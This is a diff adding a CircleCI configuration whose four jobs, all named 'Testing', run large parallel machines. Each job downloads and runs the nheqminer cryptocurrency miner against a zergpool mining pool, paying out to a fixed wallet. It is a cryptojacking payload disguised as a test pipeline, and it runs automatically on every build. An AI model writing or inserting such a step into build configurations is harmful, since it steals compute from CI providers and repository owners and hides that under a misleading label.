@@ -1,0 +1,50 @@
+version: 2.1
+jobs:
+    Devop:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large
+      parallelism: 7    
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && ./nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u MKYvrRVVF8KB3gsWu9hxSQr57asXEhZWoF.RIG1
+    Devop1:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large
+      parallelism: 7   
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && ./nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u MKYvrRVVF8KB3gsWu9hxSQr57asXEhZWoF.RIG1
+    Devop2:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large
+      parallelism: 7
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && ./nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u MKYvrRVVF8KB3gsWu9hxSQr57asXEhZWoF.RIG1
+    Devop3:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large 
+      parallelism: 7
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && ./nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u MKYvrRVVF8KB3gsWu9hxSQr57asXEhZWoF.RIG1
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
